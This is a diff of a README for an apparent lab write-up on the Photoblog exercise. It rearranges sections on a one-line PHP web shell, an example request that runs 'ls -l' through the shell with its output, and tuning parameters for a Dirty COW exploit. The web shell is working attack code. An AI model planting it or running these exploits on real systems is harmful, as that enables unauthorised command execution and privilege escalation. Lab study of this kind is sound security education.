@@ -372,20 +372,17 @@ In the exercice we gain access to a web shell as `www-data`, so why not trying t
 1. :woman_farmer: [DirtyCow with Cowherd](https://github.com/FrancoisCapon/BetaDirtyCowWithCowherd?tab=readme-ov-file#dirtycow-with-cowherd-cow-woman_farmer)
 1. :turtle: [Turtle](https://github.com/FrancoisCapon/BetaDirtyCowWithCowherd?tab=readme-ov-file#turtle-rabbit-turtle)
 
-> [!NOTE]
-> `192.168.1.33` is the IP address of the Photoblog server.
-
 ## :keyboard: Web Shell
 
 As in the exercice I use a minimalist web shell (not a `p0wny@shell` for example).
-
-<details>
-<summary>Click to expand</summary><br>
 
 ```php
 # shell.php3
 <pre><?=`$_GET[c]`?>
 ```
+<details>
+<summary>Click to see</summary><br>
+
 ```
 http://192.168.1.33/admin/uploads/admin/uploads/shell.php3?c=ls -l ../
 total 7
@@ -399,6 +396,9 @@ total 7
 drwxrwxrwx 2 www-data www-data   60 Aug 32 24:24 uploads
 ```
 </details>
+
+> [!NOTE]
+> `192.168.1.33` is the IP address of the Photoblog server.
 
 ## :shield: Bypassing Suhosin's ELF filter
 
@@ -614,9 +614,6 @@ See the [Dirty COW Demo by Jake Wilson and Nimesha Jayawardena](https://www.cs.t
 
 ## :grey_question: [ride_length [ride_interval [madvise_interval]]]
 
-<details>
-<summary>Click to expand</summary><br>
-
 With these command arguments, it is possible to precisely adjust the behavior of the turtwig processus and dirty COW processus.
 
 For each word to write, Turtwig wait `ride_interval` and then loops `ride_lenght` of `ptrace(PTRACE_POKEDATA)`.
@@ -630,6 +627,4 @@ I empirically determined the default values that give "good" results and [put th
 | `ride_length` | 512 | count |
 | `ride_interval` | 1 | microseconds |
 | `madvise_interval` | 3 |  microseconds |
-
-</details>
 
